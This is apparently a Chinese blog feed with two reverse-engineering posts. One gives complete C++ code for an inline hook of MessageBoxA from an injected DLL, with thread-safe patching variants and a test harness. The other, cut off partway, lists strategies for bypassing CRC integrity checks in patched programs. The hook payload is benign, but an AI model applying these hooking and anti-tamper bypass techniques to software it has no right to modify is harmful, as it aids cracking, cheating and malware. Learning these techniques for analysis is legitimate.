DWORD originalSize, BYTE* oldCodeAddr)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pch.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"InlineHook.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">InitHook();</span><br><span class="line">InstallHook();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">UnInstallHook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方案一-1"><a href="#方案一-1" class="headerlink" title="方案一"></a>方案一</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InlineHook.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"InlineHook.h"</span></span></span><br><span class="line"></span><br><span class="line">DWORD g_unHook = <span class="literal">NULL</span>;<span class="comment">//保存函数地址</span></span><br><span class="line">BYTE g_oldCode[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//原始的5个字节</span></span><br><span class="line">BYTE g_newCode[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;<span class="comment">//改变后的5个字节</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookMessageBox</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND    hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">LPCTSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">LPCTSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT   uType</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">UnInstallHook();<span class="comment">//先卸载钩子，防止死循环</span></span><br><span class="line"><span class="keyword">int</span> result = MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"HOOK Success"</span>), TEXT(<span class="string">"test4fun"</span>), MB_OK);</span><br><span class="line">InstallHook();</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InitHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HMODULE hMoudle = LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line"><span class="keyword">if</span> (!hMoudle) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">g_unHook = (DWORD)GetProcAddress(hMoudle, <span class="string">"MessageBoxA"</span>);</span><br><span class="line">memcpy_s(g_oldCode, <span class="number">5</span>, (BYTE*)g_unHook, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">DWORD offset = (DWORD)HookMessageBox - g_unHook - <span class="number">5</span>;</span><br><span class="line">memcpy_s(g_newCode + <span class="number">1</span>, <span class="number">4</span>, &amp;offset, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!g_unHook) &#123;<span class="comment">//初始化未成功</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">Solution1(TRUE);<span class="comment">//挂起全部其他线程</span></span><br><span class="line">DWORD OldProtect = <span class="number">0</span>;<span class="comment">//原来的内存属性</span></span><br><span class="line">VirtualProtect((DWORD*)g_unHook, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;OldProtect);<span class="comment">//修改内存地址可读可写可执行</span></span><br><span class="line">memcpy_s((DWORD*)g_unHook, <span class="number">5</span>, g_newCode, <span class="number">5</span>);<span class="comment">//把要改变的5个字节写到函数地址里</span></span><br><span class="line">VirtualProtect((DWORD*)g_unHook, <span class="number">5</span>, OldProtect, &amp;OldProtect);<span class="comment">//再将内存属性改回去</span></span><br><span class="line">Solution1(FALSE);<span class="comment">//恢复全部其他线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!g_unHook) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">Solution1(TRUE);<span class="comment">//挂起其他全部线程</span></span><br><span class="line">DWORD OldProtect = <span class="number">0</span>;<span class="comment">//原来的内存属性</span></span><br><span class="line">VirtualProtect((DWORD*)g_unHook, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;OldProtect);<span class="comment">//修改内存地址可读可写可执行</span></span><br><span class="line">memcpy_s((DWORD*)g_unHook, <span class="number">5</span>, g_oldCode, <span class="number">5</span>);<span class="comment">//把原来的5个字节写到函数地址里</span></span><br><span class="line">VirtualProtect((DWORD*)g_unHook, <span class="number">5</span>, OldProtect, &amp;OldProtect);<span class="comment">//再将内存属性改回去</span></span><br><span class="line">Solution1(FALSE);<span class="comment">//恢复其他全部线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Solution1</span><span class="params">(BOOL isSuspend)</span> </span>&#123;</span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwPid = GetCurrentProcessId();</span><br><span class="line">DWORD dwTid = GetCurrentThreadId();</span><br><span class="line">THREADENTRY32 stThreadEntry32;</span><br><span class="line">stThreadEntry32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line">HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPid);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">BOOL anymore = Thread32First(hSnapshot, &amp;stThreadEntry32);</span><br><span class="line"><span class="keyword">while</span> (anymore) &#123;</span><br><span class="line"><span class="keyword">if</span> (stThreadEntry32.th32OwnerProcessID == dwPid &amp;&amp; stThreadEntry32.th32ThreadID != dwTid) &#123;</span><br><span class="line">hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, stThreadEntry32.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isSuspend) &#123;</span><br><span class="line">SuspendThread(hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">ResumeThread(hThread);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">&#125;</span><br><span class="line">anymore = Thread32Next(hSnapshot, &amp;stThreadEntry32);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方案二-1"><a href="#方案二-1" class="headerlink" title="方案二"></a>方案二</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InlineHook.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"InlineHook.h"</span></span></span><br><span class="line"></span><br><span class="line">DWORD g_unHook = <span class="literal">NULL</span>;<span class="comment">//保存函数地址</span></span><br><span class="line">BYTE g_oldCode[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//原始的5个字节</span></span><br><span class="line">BYTE g_newCode[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;<span class="comment">//改变后的5个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookMessageBox</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND    hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">LPCTSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">LPCTSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT   uType</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">UnInstallHook();<span class="comment">//先卸载钩子，防止死循环</span></span><br><span class="line"><span class="keyword">int</span> result = MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"HOOK Success!"</span>), TEXT(<span class="string">"Test4fun"</span>), MB_OK);</span><br><span class="line">InstallHook();</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InitHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HMODULE hMoudle = LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line"><span class="keyword">if</span> (!hMoudle) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">g_unHook = (DWORD)GetProcAddress(hMoudle, <span class="string">"MessageBoxA"</span>);</span><br><span class="line">memcpy_s(g_oldCode, <span class="number">5</span>, (BYTE*)g_unHook, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!g_unHook) &#123;<span class="comment">//初始化未成功</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">Solution2_Install(g_unHook, <span class="number">5</span>, (DWORD)HookMessageBox);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!g_unHook) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">Solution2_Uninstall(g_unHook, <span class="number">5</span>, g_oldCode);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Solution2_Install</span><span class="params">(DWORD originalCodeAddr, DWORD originalSize, DWORD newCodeAddr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (originalCodeAddr == <span class="number">0</span> || originalSize &lt; <span class="number">5</span> || originalSize &gt; <span class="number">8</span> || newCodeAddr == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置内存写权限</span></span><br><span class="line">DWORD dwOldProtectFlag;</span><br><span class="line">BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag);</span><br><span class="line"><span class="keyword">if</span> (!bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 计算E9 JMP后面的4字节 = 要跳转的地址 - CALL的下一条指令的地址</span></span><br><span class="line">DWORD dwJmpCode = newCodeAddr - (originalCodeAddr + <span class="number">5</span>);</span><br><span class="line"><span class="comment">// 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节</span></span><br><span class="line">BYTE bReplace[<span class="number">8</span>] = &#123; <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;<span class="comment">//全部用NOP替换</span></span><br><span class="line">bReplace[<span class="number">0</span>] = <span class="number">0xE9</span>; <span class="comment">// JMP</span></span><br><span class="line"></span><br><span class="line">*(PDWORD)(&amp;(bReplace[<span class="number">1</span>])) = dwJmpCode;<span class="comment">//☆体会这种语句的好处</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓</span></span><br><span class="line"><span class="built_in">memcpy</span>( (BYTE*)(bReplace + originalSize),</span><br><span class="line">(LPVOID)(originalCodeAddr + originalSize), <span class="number">8</span> - originalSize);<span class="comment">//把后面字节copy过来</span></span><br><span class="line"></span><br><span class="line">LONG64 llReplace;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;llReplace, bReplace, <span class="number">8</span>);<span class="comment">//全都copy给一个64位的变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原子操作hook</span></span><br><span class="line">InterlockedExchange64((LONG64 <span class="keyword">volatile</span>*)originalCodeAddr, llReplace);</span><br><span class="line"><span class="comment">// 恢复内存属性</span></span><br><span class="line">VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, dwOldProtectFlag, &amp;dwOldProtectFlag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Solution2_Uninstall</span><span class="params">(DWORD originalCodeAddr, DWORD originalSize, BYTE * oldCodeAddr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (originalCodeAddr == <span class="number">0</span> || originalSize &lt; <span class="number">5</span> || originalSize &gt; <span class="number">8</span> || oldCodeAddr == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置内存写权限</span></span><br><span class="line">DWORD dwOldProtectFlag;</span><br><span class="line">BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag);</span><br><span class="line"><span class="keyword">if</span> (!bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节</span></span><br><span class="line">BYTE bReplace[<span class="number">8</span>] = &#123; <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;<span class="comment">//全部用NOP替换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓</span></span><br><span class="line"><span class="built_in">memcpy</span>((BYTE*)bReplace, (LPVOID)(oldCodeAddr), originalSize);<span class="comment">//还原原始的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>((BYTE*)(bReplace + originalSize),</span><br><span class="line">(LPVOID)(originalCodeAddr + originalSize), <span class="number">8</span> - originalSize);<span class="comment">//把后面字节copy过来</span></span><br><span class="line"></span><br><span class="line">LONG64 llReplace;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;llReplace, bReplace, <span class="number">8</span>);<span class="comment">//全都copy给一个64位的变量</span></span><br><span class="line"><span class="comment">// 原子操作hook</span></span><br><span class="line">InterlockedExchange64((LONG64 <span class="keyword">volatile</span>*)originalCodeAddr, llReplace);</span><br><span class="line"><span class="comment">// 恢复内存属性</span></span><br><span class="line">VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, dwOldProtectFlag, &amp;dwOldProtectFlag);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一个用于测试的demo"><a href="#一个用于测试的demo" class="headerlink" title="一个用于测试的demo"></a>一个用于测试的demo</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE hMoudle = LoadLibrary(<span class="string">"InlineHookTest.dll"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hMoudle)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"HOOK Failed"</span>), TEXT(<span class="string">"test4fun"</span>), MB_OK);<span class="comment">//调用MessageBox来检测</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果HOOK成功以后，弹出的MessageBox应该是HOOK Success</span></span><br><span class="line">    <span class="comment">//否则就会是这个HOOK Failed</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>##</p><h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p>《加密与解密》第四版</p><p>《逆向工程核心原理》</p><p><a href="https://blog.csdn.net/qq_31507523/article/details/92800468?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-92800468-blog-7269486.pc_relevant_antiscanv3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-92800468-blog-7269486.pc_relevant_antiscanv3&utm_relevant_index=2" target="_blank" rel="noopener">多线程inline hook</a></p><p><a href="https://blog.csdn.net/Kwansy/article/details/108549163?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-108549163-blog-7269486.pc_relevant_antiscanv3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-108549163-blog-7269486.pc_relevant_antiscanv3&utm_relevant_index=5" target="_blank" rel="noopener">多线程inline hook</a></p><p><a href="https://blog.51cto.com/u_15127640/4356145?b=totalstatistic" target="_blank" rel="noopener">inline hook需要注意的问题</a></p><p><code>inline hook需要注意的问题</code>这一篇里面关于挂起线程和恢复线程的代码是存在问题的，它挂起的是所有进程的线程而非目标进程的线程，<strong>本文已经对其代码进行了修改完善</strong>，不过仍要感谢文章作者提供的思路！</p><p><a href="https://stackoverflow.com/questions/15145152/is-memcpy-process-safe" target="_blank" rel="noopener">memcpy是否线程安全</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/97547828_p0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随手小记" scheme="http://liul14n.top/categories/%E9%9A%8F%E6%89%8B%E5%B0%8F%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>CRC Check Bypass</title>
    <link href="http://liul14n.top/2022/03/18/CRC-Check-Bypass/"/>
    <id>http://liul14n.top/2022/03/18/CRC-Check-Bypass/</id>
    <published>2022-03-17T17:35:56.000Z</published>
    <updated>2022-04-21T11:15:09.089Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_45691349_20190407_172803.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>太久没有更博客了，今天记录一下前段时间学到的完整性检测绕过，比如绕过CRC检测。</p><p>像一些程序，总会有一些完整性检测比如CRC。当用逆向工程的方法修改程序的代码时，程序可能会做出响应的对抗操作。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>这类检测往往是对程序的代码段进行CRC检测来判断程序的代码段是否被修改，进行CRC检测有许多好处，如能防止通过修改程序代码来暴力破解一些软件等</p><p>CRC校验值往往会存在内存中的某个位置</p><p>CRC检测的代码也会位于代码段</p><p>CRC检测几乎都会有<code>cmp 正常情况的CRC,实际检测到的CRC</code>然后跳转的操作。</p><p>基于如上分析，不难有以下几种思路，可能有不对的地方，还望各位大佬斧正！</p><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>在不改变代码段的情况下，找到存放CRC校验值的内存地址，跟踪这个内存地址，找到CRC检测的相关汇编。</p><p>然后去修改<code>cmp 正常情况的CRC,实际检测到的CRC</code>后的<code>跳转</code>，强行让程序往”检测无误的方向”进行跳转。</p><p><code>本思路优点</code>:简单粗暴，省时省力。</p><p><code>本思路缺点</code>:可能会有暗门。</p><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>在不改变代码段的情况下，找到存放CRC校验值的内存地址，跟踪这个内存地址，找到CRC检测的相关汇编。</p><p>然后主动按照我们的意愿来修改代码段，然后主动用CRC算法来得到修改后的代码段的校验值，然后将这个校验值存到一个不用的内存地址中。</p><p>强行修改CRC检测相关汇编的<code>传地址过程</code>以实现<code>cmp 我们存的CRC校验值,实际检测到的CRC校验值</code>的效果，按照前面的操作，我们存的CRC校验值就应该与实际检测到的CRC校验值相等，从而使得程序往”检测无误的方向”跳转。</p><p><code>本思路优点</code>:呃……</p><p><code>本思路缺点</code>:①实现过程中(主动修改代码段但还没来得及修改cmp部分时)，有可能直接触发CRC检测未通过；②实现起来较为麻烦；③用来存放我们计算得到的CRC校验值的时候，这个存放地址有可能选到奇奇怪怪的会触发异常的位置(虽然可以凭经验来选到一些好位置)</p><h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><p>不改变代码段，将整个代码段复制到一个不用的内存地址，同思路一和二找到CRC检测的相关汇编</p><p>这次是去修改CRC检测相关汇编的<code>扫描起点</code>与<code>扫描终点</code>，也有可能是<code>扫描起点</code>与<code>扫描长度</code>的形式</p><p>让程序去扫描我们存的代码段备份，这样我们就能放心对程序的代码段进行修改了</p><p><code>本思路优点</code>:①这种”乾坤大挪移”的思想很爽；②用这种思路写出来的脚本的通用性较强，大部分情况下只需要修改脚本的部分内容就能实现绕过检测。</p><p><code>本思路缺点</code>:①实现起来略有些麻烦；②空间复杂度较高。</p><h2 id="思路四"><a href="#思路四" class="headerlink" title="思路四"></a>思路四</h2><p>这个思路源自《加密与解密》第四版P546的⑧</p><p>思路类似于思路三，只不过这次是依然检测原始部分，但执行新部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 